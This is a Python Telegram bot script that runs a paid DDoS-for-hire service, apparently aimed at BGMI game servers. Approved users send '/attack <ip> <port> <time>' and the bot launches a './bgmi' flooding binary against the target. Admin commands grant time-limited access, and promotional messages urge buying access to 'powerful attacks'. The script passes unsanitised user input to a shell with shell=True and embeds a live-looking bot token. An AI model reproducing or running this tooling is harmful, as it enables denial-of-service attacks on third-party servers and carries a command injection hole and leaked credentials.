#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import time

# insert your Telegram bot token here
bot = telebot.TeleBot('7072312985:AAHgR5Lc87DxZANKH2cIeXCgd1PuSInMYD0')

# Admin user IDs
admin_id = ["6768273586"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store allowed user_access
USER_ACCESS_FILE = "users_access.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Define the duration of access (in seconds per day)
ACCESS_DURATION_PER_DAY = 24 * 60 * 60

# Define a dictionary to store user access data
user_access = {}

# Function to save user access data
def save_user_access(data):
    with open(USER_ACCESS_FILE, "w") as file:
        for user_id, access_info in data.items():
            file.write(f"{user_id}:{access_info['expiry_time']}\n")

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:  # Check if the command contains the user ID and number of days
            user_to_add = command[1]
            days = int(command[2])  # Extract the number of days
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                # Calculate the expiry time
                expiry_time = time.time() + days * ACCESS_DURATION_PER_DAY
                # Update user access
                user_access[user_to_add] = {"expiry_time": expiry_time}
                # Save user access data
                save_user_access(user_access)
                response = f"User {user_to_add} approved for {days} days by @MrinMoYxCB.\n\n 🅑🅞🅣 🅛🅘🅝🅚 : @ddosv1_bot"
            else:
                response = "User already exists "
        else:
            response = "Please specify a user ID and the number of days to add."
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Please specify a user ID to remove. Usage: /remove <userid>"
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_info(message):
    user_id = str(message.chat.id)
    username = message.from_user.username if message.from_user.username else "No username"
    role = "User"  # Assuming role is User, adjust if you have role information
    
    # Check if the user is in allowed_user_ids and user_access
    if user_id in allowed_user_ids and user_id in user_access:
        expiry_timestamp = user_access[user_id]["expiry_time"]
        expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Expiry Date: {expiry_date}\n"
                    )
    else:
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⚠️ Expiry Date: Not available\n"
                    )
    bot.reply_to(message, response)

# Function to handle the reply when users run the /attack command
def start_attack_reply(message, target, port, duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"Well {username}, \n\n🚀 Attack Sent Successfully! 🚀.\n\nTarget IP: {target}\n Port: {port}\nTime: {duration} seconds"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /attack command
attack_cooldown = {}

COOLDOWN_TIME = 20  # Cooldown time in seconds (20 seconds)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🚀 Attack Sent Successfully! 🚀.\n\nTarget IP : {target}\nPort : {port}\nTime : {time} seconds"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 20  # Cooldown time in seconds (20 seconds)

# Handler for /bgmi command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You are on cooldown dude. Please wait 20 seconds before running the /bgmi command again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 280:
                response = "Error: Time interval must be less than 280 seconds."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 280"
                subprocess.run(full_command, shell=True)
                response = f"🚀 Attack Finished Successfully! 🚀. \n\nTarget IP : {target}\nPort : {port}\nTime : {time} seconds."
        else:
            response = "Usage: /attack <ip> <port> <time>" # Updated command syntax
    else: 
        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! it  seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @MrinMoYxCB for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @MrinMoYxCB now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for attack and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! it seems like you don't have permission to use the /mylogs command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @MrinMoYxCB for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @MrinMoYxCB now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "Available commands:\n"
        "- /attack <ip> <port> <time> : Start an attack.\n"
        "- /rules : Please check before use.\n"
        "- /mylogs : To check your recent attacks.\n"
        "- /id : To check your user info.\n"
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = (
        f"🥀Welcome {user_name}!\n\n"
        " For User ID : /id \n\n"
        "👉 Join our official channel - @wonderboy_cd ✅\n\n"
        "👑 For access: @MrinMoYxCB\n\n"
        "👑 OWNER : @earuingamgogoi"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def show_access_expiry(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in user_access:
            expiry_timestamp = user_access[user_id]["expiry_time"]
            expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
            response = f"Your access expires on: {expiry_date}"
        else:
            response = "Your access expiry information is not available."
    else:
        response = "🚫 Unauthorized Access! 🚫\n Oops! It seems like you don't have permission to use the /plan command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner @OFFICIALRINO for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @OFFICIALRINO now and level up your capabilities!\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = (
        f"{user_name}, admin commands are here:\n\n"
        "- /add <userId> : Add a user.\n"
        "- /remove <userId> : Remove a user.\n"
        "- /allusers : Authorized users list.\n"
        "- /broadcast : Broadcast a message.\n"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = (
        f"{user_name}, please follow these rules:\n\n"
        "1. Attack starts from commands /attack <ip> <port> <time> no need of threads.\n"
        "2. Don't run 2 attacks at the same time, as it will result in a ban from the bot.\n"
        "3. In-game freeze also supported.\n"
        "4. Click on /plan from menu to check expiry details.\n"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "❌❌ ATTENTION EVERYONE ❌❌\n MEESSAGE FROM @MrinMoYxCB:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users."
        else:
            response = "Please provide a message to broadcast."
    else:
        response = "Only @MrinMoYxCB can run this command."

    bot.reply_to(message, response)

bot.polling()
